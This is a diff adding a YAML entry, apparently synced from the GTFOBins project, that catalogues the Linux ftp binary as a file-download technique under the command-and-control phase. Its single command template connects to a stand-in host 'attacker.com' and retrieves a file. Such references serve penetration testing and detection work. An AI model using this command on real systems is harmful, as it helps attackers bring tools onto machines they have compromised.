@@ -1,0 +1,26 @@
+id: gtfobins/ftp/download/unprivileged
+type: binary
+platform: linux
+name: ftp
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'ftp -a attacker.com
+
+    get /path/to/input-file output-file'
+  comment: Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.
+references:
+- https://gtfobins.github.io/gtfobins/ftp/
+tags:
+- linux
+- unix
+- gtfobins
